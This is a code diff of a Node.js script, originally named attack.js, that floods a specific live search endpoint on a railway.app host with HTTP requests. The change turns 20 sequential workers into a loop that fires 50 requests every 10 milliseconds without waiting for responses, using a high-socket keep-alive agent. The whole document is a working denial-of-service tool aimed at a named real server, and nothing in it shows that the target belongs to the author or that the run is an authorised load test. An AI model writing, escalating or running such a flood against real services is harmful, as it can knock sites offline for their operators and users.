@@ -1,31 +1,33 @@
-// attack.js
 const axios = require('axios');
+const https = require('https');
 
-const TARGET = 'https://ctrack-production-097b.up.railway.app/api/search?query=a'; // changed
-const CONCURRENT = 20; 
-const DURATION_MS = 4000; 
+const TARGET = 'https://ctrack-production-097b.up.railway.app/api/search?query=a';
+const DURATION_MS = 4000;
+const agent = new https.Agent({ keepAlive: true, maxSockets: 1000 });
 
 async function flood() {
   const start = Date.now();
   let sent = 0, ok = 0, failed = 0;
 
-  async function worker() {
-    while (Date.now() - start < DURATION_MS) {
-      sent++;
-      try {
-        await axios.get(TARGET);
-        ok++;
-      } catch {
-        failed++;
-      }
-      if (sent % 20 === 0) {           // new
-        console.log(`sent=${sent} ok=${ok} failed=${failed}`); // new
-      }                                 // new
+  // Fire requests continuously without waiting for responses to finish
+  const interval = setInterval(() => {
+    if (Date.now() - start >= DURATION_MS) {
+      clearInterval(interval);
+      return;
     }
-  }
 
-  await Promise.all(Array.from({ length: CONCURRENT }, worker));
+    // Fire 50 requests every 10ms
+    for (let i = 0; i < 50; i++) {
+      sent++;
+      axios.get(TARGET, { httpsAgent: agent, timeout: 2000 })
+        .then(() => ok++)
+        .catch(() => failed++);
+    }
+  }, 10);
+
+  // Wait for the duration + extra time for remaining requests to settle
+  await new Promise((r) => setTimeout(r, DURATION_MS + 2500));
   console.log(`FINAL: sent=${sent} ok=${ok} failed=${failed} in ${DURATION_MS}ms`);
 }
 
-flood();    
+flood();
